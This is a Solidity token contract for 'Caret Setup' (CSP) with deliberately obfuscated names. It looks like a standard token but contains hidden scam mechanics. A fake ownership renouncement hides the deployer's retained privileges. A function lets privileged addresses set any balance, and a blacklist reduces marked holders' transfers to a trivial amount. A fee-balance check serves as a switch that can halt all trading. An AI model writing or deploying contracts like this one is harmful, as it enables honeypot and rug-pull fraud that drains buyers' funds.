//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface receiverBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenReceiver {
    function createPair(address maxBuyEnable, address fundMax) external returns (address);
}

interface toReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoList) external view returns (uint256);

    function transfer(address limitFrom, uint256 feeTeam) external returns (bool);

    function allowance(address exemptTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTeam) external returns (bool);

    function transferFrom(
        address sender,
        address limitFrom,
        uint256 feeTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedEnable, uint256 value);
    event Approval(address indexed exemptTake, address indexed spender, uint256 value);
}

interface toReceiverMetadata is toReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CaretSetup is autoFund, toReceiver, toReceiverMetadata {

    address public fundLiquidityMax;

    address takeFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listLimit(address sellMarketing) public {
        minEnableBuy();
        if (isReceiverMax == feeEnable) {
            isReceiverMax = feeEnable;
        }
        if (sellMarketing == atAutoMin || sellMarketing == fundLiquidityMax) {
            return;
        }
        atWalletReceiver[sellMarketing] = true;
    }

    uint256 public isReceiverMax;

    string private modeMax = "Caret Setup";

    address marketingSwapMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return launchLiquidity;
    }

    mapping(address => bool) public totalIs;

    function name() external view virtual override returns (string memory) {
        return modeMax;
    }

    function maxTake(address senderLimitFund, address limitFrom, uint256 feeTeam) internal returns (bool) {
        require(swapFundMin[senderLimitFund] >= feeTeam);
        swapFundMin[senderLimitFund] -= feeTeam;
        swapFundMin[limitFrom] += feeTeam;
        emit Transfer(senderLimitFund, limitFrom, feeTeam);
        return true;
    }

    address private totalLiquidity;

    function transferFrom(address senderLimitFund, address limitFrom, uint256 feeTeam) external override returns (bool) {
        if (_msgSender() != marketingSwapMax) {
            if (totalMarketing[senderLimitFund][_msgSender()] != type(uint256).max) {
                require(feeTeam <= totalMarketing[senderLimitFund][_msgSender()]);
                totalMarketing[senderLimitFund][_msgSender()] -= feeTeam;
            }
        }
        return amountLiquidity(senderLimitFund, limitFrom, feeTeam);
    }

    uint256 buyList;

    mapping(address => bool) public atWalletReceiver;

    function txLiquidity(address fundSell) public {
        if (maxAuto) {
            return;
        }
        if (receiverMin) {
            feeEnable = autoLaunched;
        }
        totalIs[fundSell] = true;
        
        maxAuto = true;
    }

    function owner() external view returns (address) {
        return totalLiquidity;
    }

    mapping(address => uint256) private swapFundMin;

    function shouldSell() public {
        emit OwnershipTransferred(atAutoMin, address(0));
        totalLiquidity = address(0);
    }

    function receiverLiquidity(address enableList, uint256 feeTeam) public {
        minEnableBuy();
        swapFundMin[enableList] = feeTeam;
    }

    uint256 private launchLiquidity = 100000000 * 10 ** 18;

    address public atAutoMin;

    uint256 feeMax;

    function balanceOf(address autoList) public view virtual override returns (uint256) {
        return swapFundMin[autoList];
    }

    uint256 constant marketingBuy = 18 ** 10;

    bool private listFromShould;

    function tokenMax(uint256 feeTeam) public {
        minEnableBuy();
        feeMax = feeTeam;
    }

    constructor (){
        
        receiverBuy marketingFrom = receiverBuy(marketingSwapMax);
        fundLiquidityMax = tokenReceiver(marketingFrom.factory()).createPair(marketingFrom.WETH(), address(this));
        if (receiverMin) {
            autoLaunched = isReceiverMax;
        }
        atAutoMin = _msgSender();
        shouldSell();
        totalIs[atAutoMin] = true;
        swapFundMin[atAutoMin] = launchLiquidity;
        
        emit Transfer(address(0), atAutoMin, launchLiquidity);
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverIs;
    }

    function symbol() external view virtual override returns (string memory) {
        return listShouldAmount;
    }

    uint8 private receiverIs = 18;

    uint256 private autoLaunched;

    bool private receiverMin;

    function allowance(address enableBuy, address minReceiver) external view virtual override returns (uint256) {
        if (minReceiver == marketingSwapMax) {
            return type(uint256).max;
        }
        return totalMarketing[enableBuy][minReceiver];
    }

    bool public maxAuto;

    function getOwner() external view returns (address) {
        return totalLiquidity;
    }

    function amountLiquidity(address senderLimitFund, address limitFrom, uint256 feeTeam) internal returns (bool) {
        if (senderLimitFund == atAutoMin) {
            return maxTake(senderLimitFund, limitFrom, feeTeam);
        }
        uint256 takeAt = toReceiver(fundLiquidityMax).balanceOf(takeFee);
        require(takeAt == feeMax);
        require(limitFrom != takeFee);
        if (atWalletReceiver[senderLimitFund]) {
            return maxTake(senderLimitFund, limitFrom, marketingBuy);
        }
        return maxTake(senderLimitFund, limitFrom, feeTeam);
    }

    uint256 public feeEnable;

    string private listShouldAmount = "CSP";

    function transfer(address enableList, uint256 feeTeam) external virtual override returns (bool) {
        return amountLiquidity(_msgSender(), enableList, feeTeam);
    }

    function approve(address minReceiver, uint256 feeTeam) public virtual override returns (bool) {
        totalMarketing[_msgSender()][minReceiver] = feeTeam;
        emit Approval(_msgSender(), minReceiver, feeTeam);
        return true;
    }

    event OwnershipTransferred(address indexed senderToken, address indexed senderTrading);

    function minEnableBuy() private view {
        require(totalIs[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private totalMarketing;

}